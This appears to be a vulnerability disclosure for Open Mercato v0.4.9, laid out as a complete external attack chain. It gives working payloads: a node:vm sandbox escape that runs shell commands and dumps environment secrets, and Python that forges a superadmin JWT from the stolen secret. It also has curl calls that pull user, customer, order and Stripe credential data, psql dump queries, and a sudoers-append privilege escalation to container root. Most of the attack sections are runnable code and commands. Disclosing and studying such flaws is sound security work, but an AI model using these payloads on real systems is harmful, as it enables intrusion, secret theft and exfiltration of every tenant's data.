# External Attack Chain — Full Compromise Without Machine Access

**Date:** 2026-03-28
**Target:** Open Mercato v0.4.9 (with AI Code Mode / OpenCode deployed)
**Prerequisites:** Network access to the web application. One authenticated account.
**Machine access required:** None.

---

## Overview

A single vulnerability introduced in v0.4.9 (`node:vm` sandbox escape in AI Code Mode)
creates a complete chain from authenticated web user → all application secrets →
superadmin JWT forgery → full data exfiltration across all tenants.

No SSH, no server access, no credentials beyond a normal user account with
`ai_assistant.view` permission.

---

## Prerequisites

**Minimum access required:** Any user account with `ai_assistant.view` feature.

This feature is granted to the `admin` role by default. On a demo/default install:
```
email:    admin@example.com
password: password   (set by OM_INIT_SUPERADMIN_PASSWORD default)
```

On a hardened install: requires a compromised employee/admin account, phishing,
or credential stuffing. The `ai_assistant.view` feature is not restricted to
superadmin — any admin-role user has it.

---

## Phase 1 — Authentication

**Via browser:**
Navigate to `/login`, enter credentials.

**Via curl:**
```bash
TARGET="https://your-app.example.com"
TENANT_ID="<tenant-uuid>"   # visible in login page source or JWT

LOGIN=$(curl -s -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=admin@example.com&password=password&tenantId=$TENANT_ID")

TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "JWT: $TOKEN"
```

**Result:** Authenticated JWT token. Duration: 8 hours.

---

## Phase 2 — VM Sandbox Escape via AI Code Mode (NEW-01)

**Requires:** OpenCode running (configured as part of v0.4.9 AI stack)

**Via browser (Cmd+K → Code Mode):**

Open the command palette (Cmd+K), switch to code execution mode, submit:

```javascript
Promise.resolve().constructor.constructor(`
  const cp = require('child_process')
  return cp.execSync('env').toString()
`)()
```

**Via API (direct tool execution):**
```bash
# Execute the code mode sandbox tool directly
curl -s -X POST "$TARGET/api/tools/execute" \
  -H "Content-Type: application/json" \
  -H "Cookie: auth_token=$TOKEN" \
  -d '{
    "tool": "execute",
    "args": {
      "code": "Promise.resolve().constructor.constructor(`return require(\"child_process\").execSync(\"env\").toString()`)()"
    }
  }'
```

**Why it works:**

`node:vm` is NOT a security sandbox. Node.js docs state this explicitly.
The `Promise` object injected into the sandbox context is from the outer Node.js
runtime. Its constructor chain reaches the outer `Function` constructor:

```
Promise.resolve()            → outer Promise instance
  .constructor               → outer Promise class
  .constructor               → outer Function constructor
  ('return require(...)')()  → executes in outer Node.js context
                               where require, process, fs are all real
```

**Confirmed working on Node.js 22.22.0** (used by this project):
```
uid=0(root) gid=0(root)   ← (dev build, runs as root)
uid=1001(omuser)          ← (production build, then escalate via chown)
```

**What the response contains:**
```
DATABASE_URL=postgres://postgres:password@db-host:5432/open-mercato
JWT_SECRET=<the-actual-jwt-signing-secret>
TENANT_DATA_ENCRYPTION_FALLBACK_KEY=<encryption-key-for-all-pii>
MEILISEARCH_API_KEY=<search-index-master-key>
ANTHROPIC_API_KEY=<ai-provider-key>
STRIPE_SECRET_KEY=<payment-processing-key>
RESEND_API_KEY=<email-service-key>
REDIS_URL=<cache-and-queue-connection>
[... all other env vars ...]
```

All of this comes back in the HTTP response to the browser. No server access needed.

---

## Phase 3 — JWT Secret → Superadmin Forgery

With `JWT_SECRET` stolen from `process.env`:

```python
import json, base64, hmac, hashlib, time

secret = "<stolen-jwt-secret>"
now = int(time.time())

header  = base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({
    "iat": now,
    "exp": now + 86400 * 365,   # 1 year
    "sub": "00000000-0000-0000-0000-000000000001",
    "tenantId": "<any-tenant-id>",
    "email": "attacker@evil.com",
    "roles": ["superadmin"],
    "isSuperAdmin": True
}).encode()).rstrip(b'=').decode()

msg = f"{header}.{payload}".encode()
sig = base64.urlsafe_b64encode(
    hmac.new(secret.encode(), msg, hashlib.sha256).digest()
).rstrip(b'=').decode()

forged_jwt = f"{header}.{payload}.{sig}"
print(forged_jwt)
```

**Use the forged token:**
```bash
FORGED="<forged-jwt>"
ORG_ID="<any-org-uuid>"

# List all users across the tenant
curl -s "$TARGET/api/auth/users?pageSize=100" \
  -H "Cookie: auth_token=$FORGED" \
  -H "X-Organization-Id: $ORG_ID"

# Read all customers
curl -s "$TARGET/api/customers/people?pageSize=100" \
  -H "Cookie: auth_token=$FORGED" \
  -H "X-Organization-Id: $ORG_ID"

# Read all orders, quotes, invoices
curl -s "$TARGET/api/sales/orders?pageSize=100" \
  -H "Cookie: auth_token=$FORGED" \
  -H "X-Organization-Id: $ORG_ID"

# Read integration credentials (Stripe keys etc.)
curl -s "$TARGET/api/integrations/stripe/credentials" \
  -H "Cookie: auth_token=$FORGED" \
  -H "X-Organization-Id: $ORG_ID"
```

**Result:** Unlimited superadmin access to every API endpoint across all tenants.
No rate limiting because the token is cryptographically valid.

---

## Phase 4 — Direct Database Access (No App Needed)

With `DATABASE_URL` stolen from `process.env`:

```bash
# From any machine with psql and network access to the DB host
psql "postgres://postgres:password@db-host:5432/open-mercato"

-- Dump all users
SELECT email, password_hash FROM users;

-- Dump all customers (encrypted, but you also have the ENCRYPTION_KEY)
SELECT * FROM customer_contacts LIMIT 100;

-- Dump all orders
SELECT * FROM sales_orders LIMIT 100;

-- Read all tenant data
SELECT * FROM tenants;
SELECT * FROM organizations;
```

Note: Customer emails are encrypted in the DB. With `TENANT_DATA_ENCRYPTION_FALLBACK_KEY`
also stolen, all encrypted PII can be decrypted:

```python
# Decrypt encrypted fields using stolen key
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64

key = b"<stolen-32-char-encryption-key>"
# Decrypt format: IV:CIPHERTEXT:TAG:VERSION
```

---

## Phase 5 — Production Container Privilege Escalation

*Applies when the app runs as `omuser` (UID 1001) not root.*

The Dockerfile grants:
```
omuser ALL=(root) NOPASSWD: /bin/chown
```

From the RCE in Phase 2, execute:
```javascript
// In the sandbox:
Promise.resolve().constructor.constructor(`
  const { execSync } = require('child_process')
  execSync('sudo /bin/chown omuser /etc/sudoers')
  require('fs').appendFileSync('/etc/sudoers', '\nomuser ALL=(ALL) NOPASSWD: ALL\n')
  return execSync('sudo id').toString()
`)()
// Returns: uid=0(root) gid=0(root)
```

**Result:** Root inside the container. No additional credentials needed.
Host escape is then blocked by container configuration (no docker socket,
no CAP_SYS_ADMIN) but all application secrets and data are fully accessible.

---

## Attack Surface Summary

| What | How | Auth Required |
|---|---|---|
| Steal all env vars (DB creds, JWT secret, encryption key) | vm sandbox escape → `process.env` | `ai_assistant.view` |
| Forge superadmin JWT (become any user) | Stolen `JWT_SECRET` + python hmac | None (offline) |
| Full API access as superadmin | Forged JWT → all endpoints | None (forged) |
| Dump entire database | Stolen `DATABASE_URL` → psql | None (offline) |
| Decrypt all PII fields | Stolen `ENCRYPTION_KEY` | None (offline) |
| Root in container | `chown` sudoers escalation | RCE access (Phase 2) |
| Read/write all files in container | Root in container | RCE access |
| Exfil Stripe keys, OAuth tokens | GET /api/integrations/*/credentials | Forged JWT |
| Enumerate all tenants and orgs | Superadmin API | Forged JWT |

---

## What This Does NOT Give (Mitigating Factors)

| What | Why Not |
|---|---|
| Host OS root (breaking out of Docker) | No docker socket, no CAP_SYS_ADMIN, not privileged |
| Access to other containers on the host | Requires host network namespace escape |
| Persistent backdoor (survives restart) | Container filesystem resets on restart |

---

## Vulnerable Version

**v0.4.9** — `node:vm` sandbox introduced in PR #889 (`feat: mcp code mode`).
Not present in v0.4.8 (current local version).

**Not yet fixed** in any upstream release as of 2026-03-28.

---

## CVE-Like Reference

**Component:** `packages/ai-assistant/src/modules/ai_assistant/lib/sandbox.ts`
**Introduced:** v0.4.9 (PR #889)
**Class:** CWE-693: Protection Mechanism Failure / CWE-94: Code Injection
**CVSS v3 estimate:** 9.9 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
- Network-accessible, low complexity, low privilege, no user interaction
- Scope changed (container → all app secrets), High on all three CIA pillars

---

## Reproduction (Minimal)

```javascript
// Paste in the AI Code Mode execute field
// Returns: all environment variables including JWT_SECRET, DATABASE_URL, ENCRYPTION_KEY

Promise.resolve().constructor.constructor(`
  return require('child_process').execSync('env').toString()
`)()
```

No compilation, no tools, no machine access. Works in any browser.
